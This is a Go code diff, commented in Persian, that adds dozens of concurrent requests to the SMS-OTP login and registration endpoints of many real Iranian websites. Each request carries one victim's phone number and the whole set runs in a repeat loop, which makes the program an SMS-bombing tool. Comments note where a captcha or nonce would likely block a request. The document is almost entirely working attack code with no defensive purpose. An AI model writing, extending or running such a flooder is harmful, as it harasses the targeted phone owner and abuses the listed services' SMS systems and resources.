@@ -274,12 +274,403 @@ func main() {
 	// --- حلقه اصلی برای اضافه کردن وظایف ---
 	for i := 0; i < repeatCount; i++ {
            
-           		wg.Add(1) // api.snapp.ir (JSON)
+// https://www.irantic.com/api/login/authenticate (JSON)
+		wg.Add(1)
 		tasks <- func() {
-			sendJSONRequest(ctx, "https://api.snapp.ir/api/v1/sms/link", map[string]interface{}{
-				"phone": phone,
+			sendJSONRequest(ctx, "https://www.irantic.com/api/login/authenticate", map[string]interface{}{
+				"mobile": phone, // نیاز به 0 اول دارد
 			}, &wg, ch)
-		}   
+		}
+
+		// https://admin.zoodex.ir/api/v2/login/check?need_sms=1 (JSON)
+		wg.Add(1)
+		tasks <- func() {
+			sendJSONRequest(ctx, "https://admin.zoodex.ir/api/v2/login/check?need_sms=1", map[string]interface{}{
+				"mobile": phone, // نیاز به 0 اول دارد
+			}, &wg, ch)
+		}
+
+		// https://poltalk.me/api/v1/auth/phone (JSON)
+		wg.Add(1)
+		tasks <- func() {
+			sendJSONRequest(ctx, "https://poltalk.me/api/v1/auth/phone", map[string]interface{}{
+				"phone": phone, // نیاز به 0 اول دارد
+			}, &wg, ch)
+		}
+
+		// https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/getLoginMethod (JSON) - ghabzino part 1
+		wg.Add(1)
+		tasks <- func() {
+			sendJSONRequest(ctx, "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/getLoginMethod", map[string]interface{}{
+				"Parameters": map[string]interface{}{
+					"MobileNumber": getPhoneNumberPlus98NoZero(phone), // نیاز به +98 دارد
+					"ApplicationType": "Web",
+					"ApplicationUniqueToken": "web",
+					"ApplicationVersion": "1.0.0",
+				},
+			}, &wg, ch)
+		}
+
+		// https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode (JSON) - ghabzino part 2
+		wg.Add(1)
+		tasks <- func() {
+			sendJSONRequest(ctx, "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", map[string]interface{}{
+				"Parameters": map[string]interface{}{
+					"MobileNumber": getPhoneNumberPlus98NoZero(phone), // نیاز به +98 دارد
+					"ApplicationType": "Web",
+					"ApplicationUniqueToken": "web",
+					"ApplicationVersion": "1.0.0",
+				},
+			}, &wg, ch)
+		}
+
+
+		// https://gharar.ir/users/phone_number/ (Form Data)
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("phone", phone) // نیاز به 0 اول دارد
+			sendFormRequest(ctx, "https://gharar.ir/users/phone_number/", formData, &wg, ch)
+		}
+
+		// https://farsgraphic.com/wp-admin/admin-ajax.php (Form Data - Part 1) - پیچیده، پارامترهای ثابت زیاد
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("digits_reg_name", "test") // مقادیر ثابت
+			formData.Set("digits_reg_lastname", "test") // مقادیر ثابت
+			formData.Set("email", "test@example.com") // مقادیر ثابت
+			formData.Set("digt_countrycode", "+98") // کد کشور ثابت
+			formData.Set("phone", getPhoneNumberNoZero(phone)) // نیاز به شماره بدون 0 اول و بدون فاصله دارد
+			formData.Set("digits_reg_password", "testpassword") // مقادیر ثابت
+			formData.Set("digits_process_register", "1") // مقادیر ثابت
+			formData.Set("instance_id", "placeholder") // ممکن است نیاز به دینامیک باشد
+			formData.Set("optional_data", "optional_data") // مقادیر ثابت
+			formData.Set("action", "digits_forms_ajax") // مقادیر ثابت
+			formData.Set("type", "register") // مقادیر ثابت
+			formData.Set("dig_otp", "") // خالی
+			formData.Set("digits", "1") // مقادیر ثابت
+			formData.Set("digits_redirect_page", "-1") // مقادیر ثابت
+			formData.Set("digits_form", "placeholder") // ممکن است نیاز به دینامیک باشد
+			formData.Set("_wp_http_referer", "/") // مقادیر ثابت
+
+			sendFormRequest(ctx, "https://farsgraphic.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+		}
+
+		// https://farsgraphic.com/wp-admin/admin-ajax.php (Form Data - Part 2) - پیچیده، پارامترهای ثابت زیاد
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("digits_reg_name", "test") // مقادیر ثابت
+			formData.Set("digits_reg_lastname", "test") // مقادیر ثابت
+			formData.Set("email", "test@example.com") // مقادیر ثابت
+			formData.Set("digt_countrycode", "+98") // کد کشور ثابت
+			formData.Set("phone", getPhoneNumberNoZero(phone)) // نیاز به شماره بدون 0 اول و بدون فاصله دارد
+			formData.Set("digits_reg_password", "testpassword") // مقادیر ثابت
+			formData.Set("digits_process_register", "1") // مقادیر ثابت
+			formData.Set("sms_otp", "") // خالی
+			formData.Set("digits_otp_field", "1") // مقادیر ثابت
+			formData.Set("instance_id", "placeholder") // ممکن است نیاز به دینامیک باشد
+			formData.Set("optional_data", "optional_data") // مقادیر ثابت
+			formData.Set("action", "digits_forms_ajax") // مقادیر ثابت
+			formData.Set("type", "register") // مقادیر ثابت
+			formData.Set("dig_otp", "otp") // مقادیر ثابت
+			formData.Set("digits", "1") // مقادیر ثابت
+			formData.Set("digits_redirect_page", "-1") // مقادیر ثابت
+			formData.Set("_wp_http_referer", "/") // مقادیر ثابت
+			formData.Set("container", "digits_protected") // مقادیر ثابت
+			formData.Set("sub_action", "sms_otp") // مقادیر ثابت
+
+
+			sendFormRequest(ctx, "https://farsgraphic.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+		}
+
+
+		// https://www.glite.ir/wp-admin/admin-ajax.php (Form Data)
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("action", "mreeir_send_sms") // مقادیر ثابت
+			formData.Set("mobileemail", phone) // نیاز به 0 اول دارد
+			formData.Set("userisnotauser", "") // خالی
+			formData.Set("type", "mobile") // مقادیر ثابت
+			formData.Set("captcha", "") // نیاز به کپچا - احتمالا موفق نیست
+			formData.Set("captchahash", "") // نیاز به کپچا - احتمالا موفق نیست
+			formData.Set("security", "placeholder") // ممکن است نیاز به دینامیک باشد
+
+			sendFormRequest(ctx, "https://www.glite.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
+		}
+
+		// https://raminashop.com/wp-admin/admin-ajax.php (Form Data) - پیچیده، پارامترهای ثابت زیاد
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("action", "digits_check_mob") // مقادیر ثابت
+			formData.Set("countrycode", "+98") // کد کشور ثابت
+			formData.Set("mobileNo", phone) // نیاز به 0 اول دارد
+			formData.Set("csrf", "placeholder") // ممکن است نیاز به دینامیک باشد
+			formData.Set("login", "2") // مقادیر ثابت
+			formData.Set("username", "") // خالی
+			formData.Set("email", "") // خالی
+			formData.Set("captcha", "") // نیاز به کپچا - احتمالا موفق نیست
+			formData.Set("captcha_ses", "") // نیاز به کپچا - احتمالا موفق نیست
+			formData.Set("digits", "1") // مقادیر ثابت
+			formData.Set("json", "1") // مقادیر ثابت
+			formData.Set("whatsapp", "0") // مقادیر ثابت
+			formData.Set("digits_reg_name", "test") // مقادیر ثابت
+			formData.Set("digregcode", "+98") // مقادیر ثابت
+			formData.Set("digits_reg_mail", phone) // ممکن است به جای ایمیل، شماره تلفن با 0 نیاز داشته باشد
+			formData.Set("dig_otp", "") // خالی
+			formData.Set("code", "") // خالی
+			formData.Set("dig_reg_mail", "") // خالی
+			formData.Set("dig_nounce", "placeholder") // ممکن است نیاز به دینامیک باشد
+
+
+			sendFormRequest(ctx, "https://raminashop.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+		}
+
+
+		// https://www.chaymarket.com/wp-admin/admin-ajax.php (Form Data) - پیچیده، پارامترهای ثابت زیاد
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("action", "digits_check_mob") // مقادیر ثابت
+			formData.Set("countrycode", "+98") // کد کشور ثابت
+			formData.Set("mobileNo", phone) // نیاز به 0 اول دارد
+			formData.Set("csrf", "placeholder") // ممکن است نیاز به دینامیک باشد
+			formData.Set("login", "2") // مقادیر ثابت
+			formData.Set("username", "") // خالی
+			formData.Set("email", "test@example.com") // ایمیل ثابت
+			formData.Set("captcha", "") // نیاز به کپچا - احتمالا موفق نیست
+			formData.Set("captcha_ses", "") // نیاز به کپچا - احتمالا موفق نیست
+			formData.Set("json", "1") // مقادیر ثابت
+			formData.Set("whatsapp", "0") // مقادیر ثابت
+
+
+			sendFormRequest(ctx, "https://www.chaymarket.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+		}
+
+
+		// https://refahtea.ir/wp-admin/admin-ajax.php (Form Data)
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("action", "refah_send_code") // مقادیر ثابت
+			formData.Set("mobile", phone) // نیاز به 0 اول دارد
+			formData.Set("security", "placeholder") // ممکن است نیاز به دینامیک باشد
+
+			sendFormRequest(ctx, "https://refahtea.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
+		}
+
+
+		// https://api6.arshiyaniha.com/api/v2/client/otp/send (JSON) - فرمت عجیب شماره تلفن
+		wg.Add(1)
+		tasks <- func() {
+			sendJSONRequest(ctx, "https://api6.arshiyaniha.com/api/v2/client/otp/send", map[string]interface{}{
+				"cellphone": "0" + getPhoneNumber98NoZero(phone), // نیاز به 0098... دارد
+				"country_code": "98", // کد کشور ثابت
+			}, &wg, ch)
+		}
+
+		// https://steelalborz.com/wp-admin/admin-ajax.php (Form Data) - پیچیده، پارامترهای ثابت زیاد
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("action", "digits_check_mob") // مقادیر ثابت
+			formData.Set("countrycode", "+98") // کد کشور ثابت
+			formData.Set("mobileNo", phone) // نیاز به 0 اول دارد
+			formData.Set("csrf", "placeholder") // ممکن است نیاز به دینامیک باشد
+			formData.Set("login", "2") // مقادیر ثابت
+			formData.Set("username", "") // خالی
+			formData.Set("email", "") // خالی
+			formData.Set("captcha", "") // نیاز به کپچا - احتمالا موفق نیست
+			formData.Set("captcha_ses", "") // نیاز به کپچا - احتمالا موفق نیست
+			formData.Set("digits", "1") // مقادیر ثابت
+			formData.Set("json", "1") // مقادیر ثابت
+			formData.Set("whatsapp", "0") // مقادیر ثابت
+			formData.Set("digits_reg_name", "test") // مقادیر ثابت
+			formData.Set("digits_reg_lastname", "test") // مقادیر ثابت
+			formData.Set("digregcode", "+98") // مقادیر ثابت
+			formData.Set("digits_reg_mail", phone) // ممکن است به جای ایمیل، شماره تلفن با 0 نیاز داشته باشد
+			formData.Set("dig_otp", "") // خالی
+			formData.Set("code", "") // خالی
+			formData.Set("dig_reg_mail", "") // خالی
+			formData.Set("dig_nounce", "placeholder") // ممکن است نیاز به دینامیک باشد
+
+			sendFormRequest(ctx, "https://steelalborz.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+		}
+
+		// https://pirankalaco.ir/SendPhone.php (Form Data)
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("phone", phone) // نیاز به 0 اول دارد
+			sendFormRequest(ctx, "https://pirankalaco.ir/SendPhone.php", formData, &wg, ch)
+		}
+
+		// https://kafegheymat.com/shop/getLoginSms (JSON) - نیاز به کپچا
+		wg.Add(1)
+		tasks <- func() {
+			sendJSONRequest(ctx, "https://kafegheymat.com/shop/getLoginSms", map[string]interface{}{
+				"phone": phone, // نیاز به 0 اول دارد
+				"captcha": "placeholder", // نیاز به کپچا - احتمالا موفق نیست
+			}, &wg, ch)
+		}
+
+		// https://hiword.ir/wp-admin/admin-ajax.php (Form Data - Part 3 SMS OTP) - پیچیده، پارامترهای ثابت زیاد و احتمالا نیاز به دینامیک
+		// این بخش از اطلاعات شما بیشتر شبیه مرحله ثبت نام بود تا صرفا درخواست OTP.
+		// بر اساس آخرین بخش داده شده (sub_action: sms_otp) کدنویسی می شود، اما ممکن است کار نکند.
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("digits_reg_name", "test") // مقادیر ثابت
+			formData.Set("email", "test@example.com") // مقادیر ثابت
+			formData.Set("digt_countrycode", "+98") // کد کشور ثابت
+			formData.Set("phone", getPhoneNumberNoZero(phone)) // نیاز به شماره بدون 0 اول و بدون فاصله دارد
+			formData.Set("digits_reg_password", "testpassword") // مقادیر ثابت
+			formData.Set("digits_process_register", "1") // مقادیر ثابت
+			formData.Set("sms_otp", "") // خالی
+			formData.Set("otp_step_1", "1") // مقادیر ثابت
+			formData.Set("digits_otp_field", "1") // مقادیر ثابت
+			formData.Set("instance_id", "placeholder") // ممکن است نیاز به دینامیک باشد
+			formData.Set("optional_data", "optional_data") // مقادیر ثابت
+			formData.Set("action", "digits_forms_ajax") // مقادیر ثابت
+			formData.Set("type", "register") // مقادیر ثابت
+			formData.Set("dig_otp", "otp") // مقادیر ثابت
+			formData.Set("digits", "1") // مقادیر ثابت
+			formData.Set("digits_redirect_page", "-1") // مقادیر ثابت
+			formData.Set("mobile", phone) // نیاز به 0 اول دارد (اینجا از mobile استفاده می‌کنیم)
+			formData.Set("digits_form", "placeholder") // ممکن است نیاز به دینامیک باشد
+			formData.Set("_wp_http_referer", "/") // مقادیر ثابت
+			formData.Set("container", "digits_protected") // مقادیر ثابت
+			formData.Set("sub_action", "sms_otp") // مقادیر ثابت
+
+			sendFormRequest(ctx, "https://hiword.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
+		}
+
+		// https://api.snapp.doctor/core/Api/Common/v1/sendVerificationCode/09123456456/sms?cCode=%2B98 (GET)
+		wg.Add(1)
+		tasks <- func() {
+			// شماره تلفن مستقیم در URL قرار می‌گیرد
+			urlWithPhone := fmt.Sprintf("https://api.snapp.doctor/core/Api/Common/v1/sendVerificationCode/%s/sms?cCode=+98", phone) // نیاز به 0 اول و کد کشور در Query
+			sendGETRequest(ctx, urlWithPhone, &wg, ch)
+		}
+
+		// https://tagmond.com/phone_number (Form Data) - نیاز به کپچا
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("utf8", "✓") // مقادیر ثابت
+			formData.Set("custom_comment_body_hp_24124", "") // خالی
+			formData.Set("phone_number", phone) // نیاز به 0 اول دارد
+			formData.Set("recaptcha", "placeholder") // نیاز به کپچا - احتمالا موفق نیست
+
+			sendFormRequest(ctx, "https://tagmond.com/phone_number", formData, &wg, ch)
+		}
+
+		// https://okcs.com/users/mobilelogin (Form Data)
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("mobile", phone) // نیاز به 0 اول دارد
+			formData.Set("url", "https://okcs.com/") // مقادیر ثابت
+			sendFormRequest(ctx, "https://okcs.com/users/mobilelogin", formData, &wg, ch)
+		}
+
+
+		// https://pakhsh.shop/wp-admin/admin-ajax.php (Form Data - Part 1) - پیچیده، پارامترهای ثابت زیاد
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("digt_countrycode", "+98") // کد کشور ثابت
+			formData.Set("phone", getPhoneNumberNoZero(phone)) // نیاز به شماره بدون 0 اول دارد
+			formData.Set("digits_reg_name", "test") // مقادیر ثابت
+			formData.Set("digits_process_register", "1") // مقادیر ثابت
+			formData.Set("instance_id", "placeholder") // ممکن است نیاز به دینامیک باشد
+			formData.Set("optional_data", "optional_data") // مقادیر ثابت
+			formData.Set("action", "digits_forms_ajax") // مقادیر ثابت
+			formData.Set("type", "register") // مقادیر ثابت
+			formData.Set("dig_otp", "") // خالی
+			formData.Set("digits", "1") // مقادیر ثابت
+			formData.Set("digits_redirect_page", "-1") // مقادیر ثابت
+			formData.Set("digits_form", "placeholder") // ممکن است نیاز به دینامیک باشد
+			formData.Set("_wp_http_referer", "/") // مقادیر ثابت
+
+			sendFormRequest(ctx, "https://pakhsh.shop/wp-admin/admin-ajax.php", formData, &wg, ch)
+		}
+
+		// https://pakhsh.shop/wp-admin/admin-ajax.php (Form Data - Part 2 SMS OTP) - پیچیده، پارامترهای ثابت زیاد
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("digt_countrycode", "+98") // کد کشور ثابت
+			formData.Set("phone", getPhoneNumberNoZero(phone)) // نیاز به شماره بدون 0 اول دارد
+			formData.Set("digits_reg_name", "test") // مقادیر ثابت
+			formData.Set("digits_process_register", "1") // مقادیر ثابت
+			formData.Set("sms_otp", "") // خالی
+			formData.Set("otp_step_1", "1") // مقادیر ثابت
+			formData.Set("signup_otp_mode", "1") // مقادیر ثابت
+			formData.Set("instance_id", "placeholder") // ممکن است نیاز به دینامیک باشد
+			formData.Set("optional_data", "optional_data") // مقادیر ثابت
+			formData.Set("action", "digits_forms_ajax") // مقادیر ثابت
+			formData.Set("type", "register") // مقادیر ثابت
+			formData.Set("dig_otp", "") // خالی
+			formData.Set("digits", "1") // مقادیر ثابت
+			formData.Set("digits_redirect_page", "-1") // مقادیر ثابت
+			formData.Set("digits_form", "placeholder") // ممکن است نیاز به دینامیک باشد
+			formData.Set("_wp_http_referer", "/") // مقادیر ثابت
+			formData.Set("container", "digits_protected") // مقادیر ثابت
+			formData.Set("sub_action", "sms_otp") // مقادیر ثابت
+
+			sendFormRequest(ctx, "https://pakhsh.shop/wp-admin/admin-ajax.php", formData, &wg, ch)
+		}
+
+		// https://www.didnegar.com/wp-admin/admin-ajax.php (Form Data)
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("action", "PLWN_ajax_send_sms") // مقادیر ثابت
+			formData.Set("nonce", "placeholder") // ممکن است نیاز به دینامیک باشد
+			formData.Set("mobile_number", phone) // نیاز به 0 اول دارد
+
+			sendFormRequest(ctx, "https://www.didnegar.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+		}
+
+		// https://www.drsaina.com/api/v1/authentication/user-exist?PhoneNumber=09123456456 (GET)
+		wg.Add(1)
+		tasks <- func() {
+			// شماره تلفن در Query String قرار می‌گیرد
+			urlWithPhone := fmt.Sprintf("https://www.drsaina.com/api/v1/authentication/user-exist?PhoneNumber=%s", phone) // نیاز به 0 اول
+			sendGETRequest(ctx, urlWithPhone, &wg, ch)
+		}
+
+		// https://my.limoome.com/auth/check-mobile (JSON - Part 1)
+		wg.Add(1)
+		tasks <- func() {
+			sendJSONRequest(ctx, "https://my.limoome.com/auth/check-mobile", map[string]interface{}{
+				"mobileNumber": getPhoneNumberNoZero(phone), // نیاز به شماره بدون 0 اول
+				"countryId": "1", // مقادیر ثابت
+			}, &wg, ch)
+		}
+
+		// https://my.limoome.com/api/auth/login/otp (Form Data - Part 2) - نیاز به کپچا
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("mobileNumber", getPhoneNumberNoZero(phone)) // نیاز به شماره بدون 0 اول
+			formData.Set("country", "1") // مقادیر ثابت
+			formData.Set("recaptchaToken", "placeholder") // نیاز به کپچا - احتمالا موفق نیست
+
+			sendFormRequest(ctx, "https://my.limoome.com/api/auth/login/otp", formData, &wg, ch)
+		}
+
+		// https://bimito.com/api/vehicleorder/v2/app/auth/check-login-availability/ (JSON)
+		wg.Add(1)
+		tasks <- func() {
+			sendJSONRequest(ctx, "https://bimito.com/api/vehicleorder/v2/app/auth/check-login-availability/", map[string]interface{}{
+				"phoneNumber": phone, // نیاز به 0 اول دارد
+			}, &wg, ch)
+		}
 
 	} // --- پایان حلقه اصلی برای اضافه کردن وظایف ---
 
